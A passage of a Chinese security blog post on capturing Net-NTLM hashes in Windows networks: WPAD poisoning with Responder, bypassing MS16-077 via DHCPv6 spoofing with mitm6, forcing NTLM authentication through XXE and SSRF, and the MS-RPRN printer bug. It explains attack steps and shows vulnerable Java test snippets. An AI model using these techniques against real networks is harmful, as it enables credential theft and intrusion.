<li>受害者会使用ISAProxySrv:3141作为代理，但是受害者不知道ISAProxySrv对应的ip是什么，所以会再次查询，Responder再次通过llmnr投毒进行欺骗。将ISAProxySrv指向Responder本身。然后开始中间人攻击。这个时候可以做的事就很多了。比如插入xss payload获取net-ntlm hash，中间人获取post，cookie等参数，通过basic认证进行钓鱼，诱导下载exe等等，Responder都支持。这里就不详细展开了。</li>
</ol>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0117f2b2b74492c155.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt018c07f17c72927703.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt016ba5e76024598fbc.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt015a010924cea2849f.png"></p>
<p>然而，微软在2016年发布了<a target="_blank" rel="noopener" href="https://support.microsoft.com/en-us/topic/ms16-077-security-update-for-wpad-june-14-2016-2490f086-dc17-4a6e-2799-a974d1af385e">MS16-077</a>安全公告，添加了两个重要的保护措施，以缓解这类攻击行为：</p>
<p>1、系统再也无法通过广播协议来解析WPAD文件的位置，只能通过使用DHCP或DNS协议完成该任务。</p>
<p>2、更改了PAC文件下载的默认行为，以便当WinHTTP请求PAC文件时，不会自动发送客户端的域凭据来响应NTLM或协商身份验证质询。</p>
<h4 id="配合DHCPv6"><a href="#配合DHCPv6" class="headerlink" title="配合DHCPv6"></a>配合DHCPv6</h4><p>前面说过，针对在查询WPAD的时候进行投毒欺骗这种攻击方式，微软添加了两个重要的保护措施</p>
<p>1、系统再也无法通过广播协议来解析WPAD文件的位置，只能通过使用DHCP或DNS协议完成该任务。</p>
<p>2、更改了PAC文件下载的默认行为，以便当WinHTTP请求PAC文件时，不会自动发送客户端的域凭据来响应NTLM或协商身份验证质询。</p>
<p>第二个保护措施比较好绕过，我们先来绕过这个。更改了PAC文件下载的默认行为，以便当WinHTTP请求PAC文件时，不会自动发送客户端的域凭据来响应NTLM或协商身份验证质询。这个其实比较好解决，在访问pac文件的时候，我们没办法获取到用户的net-ntlm hash。其实默认responder就不想在这一步获取net-ntlm hash，他默认不开启，要手动加-F选项才能开启。我们可以给用户返回一个正常的wpad。将代理指向我们自己，然后我们作为中间人。这个时候可以做的事就很多了。比如插入xss payload获取net-ntlm hash，中间人获取post，cookie等参数，通过basic认证进行钓鱼，诱导下载exe等等。这个可以回去上一小节配合LLMNR&#x2F;NBNS投毒看看。</p>
<p>在网上也有一种比较巧妙的绕过姿势。我们可以给用户返回一个正常的wpad。将代理指向我们自己，当受害主机连接到我们的“代理”服务器时，我们可以通过HTTP CONNECT动作、或者GET请求所对应的完整URI路径来识别这个过程，然后回复HTTP 407错误（需要代理身份验证），这与401不同，IE&#x2F;Edge以及Chrome浏览器（使用的是IE设置）会自动与代理服务器进行身份认证，即使在最新版本的Windows系统上也是如此。在Firefox中，用户可以配置这个选项，该选项默认处于启用状态。</p>
<p>所以我们接下来的任务是要来绕过第一个保护措施</p>
<blockquote>
<p>系统再也无法通过广播协议来解析WPAD文件的位置，只能通过使用DHCP选项或DNS协议完成该任务。</p>
</blockquote>
<p>这个就保证了llmnr投毒和nbns投毒不能用了。我们来回顾下用户获取pac文件的一般流程。</p>
<ol>
<li>通过DHCP服务器</li>
<li>查询WPAD主机的IP<ul>
<li>Hosts</li>
<li>DNS (cache &#x2F; server)</li>
<li>LLMNR</li>
<li>NBNS<br>在<a target="_blank" rel="noopener" href="https://support.microsoft.com/en-us/topic/ms16-077-security-update-for-wpad-june-14-2016-2490f086-dc17-4a6e-2799-a974d1af385e">MS16-077</a>之后，通过DHCP和DNS协议还可以获取到pac文件。<br>DHCP和DNS都有指定的服务器，不是通过广播包，而且dhcp服务器和dns服务器我们是不可控的，没法进行投毒。<br>幸运的是安全研究人员并不将目光局限在ipv4，从Windows Vista以来，所有的Windows系统（包括服务器版系统）都会启用IPv6网络，并且其优先级要高于IPv4网络。这里我们要用到DHCPV6协议。<br>DHCPv6协议中，客户端通过向组播地址发送Solicit报文来定位DHCPv6服务器，组播地址[ff02::1:2]包括整个地址链路范围内的所有DHCPv6服务器和中继代理。DHCPv6四步交互过程，客户端向[ff02::1:2]组播地址发送一个Solicit请求报文，DHCP服务器或中继代理回应Advertise消息告知客户端。客户端选择优先级最高的服务器并发送Request信息请求分配地址或其他配置信息，最后服务器回复包含确认地址，委托前缀和配置（如可用的DNS或NTP服务器）的Relay消息。通俗点来说就是，在可以使用ipv6的情况(Windows Vista以后默认开启),攻击者能接收到其他机器的dhcpv6组播包的情况下，攻击者最后可以让受害者的DNS设置为攻击者的IPv6地址。<br>Fox-IT公布了名为<a target="_blank" rel="noopener" href="https://github.com/dirkjanm/mitm6">mitm6</a>的一个工具，可以实施这种攻击。<br>mitm6首先侦听攻击者计算机的某个网卡上的DHCPV6流量。</li>
</ul>
</li>
</ol>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01790566498077fb89.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01e450d84acb5b4886.png"></p>
<p>当目标计算机重启或重新进行网络配置（如重新插入网线）时， 将会向DHCPv6发送请求获取IPv6配置</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0107c2b3399eb8c7e9.png"></p>
<p>这个时候mitm6将回复这些DHCPv6请求，并在链接本地范围内为受害者分配一个IPv6地址。尽管在实际的IPv6网络中，这些地址是由主机自己自动分配的，不需要由DHCP服务器配置，但这使我们有机会将攻击者IP设置为受害者的默认IPv6 DNS服务器。应当注意，mitm6当前仅针对基于Windows的操作系统，因为其他操作系统（如macOS和Linux）不使用DHCPv6进行DNS服务器分配。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt016c35bea3e45cabc3.png"></p>
<p>这个时候受害者的dns 服务器的地址已经设置为攻击者的IPv6地址。一旦受害机器将攻击者设置为IPv6 DNS服务器，它将立即开始查询网络的WPAD配置。由于这些DNS查询是发送给攻击者的，因此攻击者仅可以使用自己的IP地址作为WPAD对应的IP地址。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt018d19d568176b275a.png"></p>
<p>至此MS16-077的两个保护措施都能绕过，再遇到MS16-077之后的机子不妨试试这种方法。</p>
<h3 id="XXE-amp-amp-SSRF"><a href="#XXE-amp-amp-SSRF" class="headerlink" title="XXE &amp;&amp; SSRF"></a>XXE &amp;&amp; SSRF</h3><h4 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h4><p>在xxe里面加载外部文件的时候，如果路径支持unc路径的话，是能拿到net-ntlm hash的。</p>
<p>这里使用javajavax.xml.parsers进行测试,测试代码如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line">DocumentBuilder db = dbf.newDocumentBuilder();</span><br><span class="line">Document doc = db.parse(request.getInputStream());</span><br></pre></td></tr></table></figure>

<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0196371e3c0a838947.png"></p>
<p>成功打回net-ntlm hash</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0148cdbaede51f0c63.png"></p>
<p>如果不支持UNC，可再测试http协议</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01a738a620adf08b5f.png"></p>
<p>成功打回net-ntlm hash。</p>
<h4 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h4><p>在ssrf里面如果支持file协议，并且file协议能加载远程资源的话，是能拿到net-ntlm hash的。</p>
<p>这里使用JAVA的HttpURLConnection进行测试，测试代码如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(url);</span><br><span class="line"><span class="type">URLConnection</span> <span class="variable">urlConnection</span> <span class="operator">=</span> u.openConnection();</span><br><span class="line"><span class="type">HttpURLConnection</span> <span class="variable">httpUrl</span> <span class="operator">=</span> (HttpURLConnection)urlConnection;</span><br><span class="line"><span class="type">BufferedReader</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(httpUrl.getInputStream()));</span><br></pre></td></tr></table></figure>

<p>当只支持HTTP协议的时候，也是可能打回net-ntlm hash的。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01d47c4970589d80b9.png"></p>
<p>成功打回net-ntlm hash</p>
<p>各个语言触发XXE和SSRF的实现不同。同一门语言也有不同的触发方式，这里并没有一一测试。</p>
<p>只要支持UNC路径都能打回net-ntlm hash,如果支持http的话，得看底层实现，有些底层实现是需要判断是否在信任域的，有些底层实现是不需要判断是否信任域，有些需要判断是否信任域里面，但是判断是否在信任域的代码是这样。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">DefaultNTLMAuthenticationCallback</span> <span class="keyword">extends</span> <span class="title class_">NTLMAuthenticationCallback</span> &#123;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isTrustedSite</span><span class="params">(URL url)</span> &#123; <span class="keyword">return</span> <span class="literal">true</span>; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在xxe和ssrf测试中一般要测试这两个方面:</p>
<ol>
<li>支不支持UNC路径，比如\ip\x或者file:&#x2F;&#x2F;ip&#x2F;x</li>
<li>支不支持HTTP(这个一般支持),是不是需要信任域，信任域是怎么判断的</li>
</ol>
<p>各个语言，各个模块的测试，这里并没有一一测试。</p>
<h3 id="打印机漏洞"><a href="#打印机漏洞" class="headerlink" title="打印机漏洞"></a>打印机漏洞</h3><p>Windows的MS-RPRN协议用于打印客户机和打印服务器之间的通信，默认情况下是启用的。协议定义的RpcRemoteFindFirstPrinterChangeNotificationEx()调用创建一个远程更改通知对象，该对象监视对打印机对象的更改，并将更改通知发送到打印客户端。</p>
<p>任何经过身份验证的域成员都可以连接到远程服务器的打印服务（spoolsv.exe），并请求对一个新的打印作业进行更新，令其将该通知发送给指定目标。之后它会将立即测试该连接，即向指定目标进行身份验证（攻击者可以选择通过Kerberos或NTLM进行验证）。另外微软表示这个bug是系统设计特点，无需修复。</p>
<p>如下图，使用printerbug.py对172.16.100.5发起请求，172.16.100.5就会向172.16.100.1发起ntlm 请求。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0194265565e1e16f3a.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01b973a1501589a825.png"></p>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/%E5%90%8E%E6%B8%97%E9%80%8F/" rel="tag"><i class="fa fa-tag"></i> 后渗透</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/gadgets/CommonsCollections%20%E7%B3%BB%E5%88%97%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="prev" title="CommonsCollections 系列反序列化">
                  <i class="fa fa-chevron-left"></i> CommonsCollections 系列反序列化
                </a>
            </div>
            <div class="post-nav-item">
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 2019 – 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">nu1r</span>
</div>

    </div>
  </footer>

  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js" integrity="sha256-yt2kYMy0w8AbtF89WXb2P1rfjcP/HTHLT7097U8Y5b8=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>

  
<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.0/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>



  <script src="/js/third-party/fancybox.js"></script>

  <script src="/js/third-party/pace.js"></script>

  




  

  <script class="next-config" data-name="enableMath" type="application/json">false</script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.16.0/katex.min.css" integrity="sha256-uik/hNqHWZldXh/0K35nqOSCff9F61/ZOFReqNOBgB0=" crossorigin="anonymous">
  <script class="next-config" data-name="katex" type="application/json">{"copy_tex_js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.16.0/contrib/copy-tex.min.js","integrity":"sha256-Us54+rSGDSTvIhKKUs4kygE2ipA0RXpWWh0/zLqw3bs="}}</script>
  <script src="/js/third-party/math/katex.js"></script>



</body>
</html>
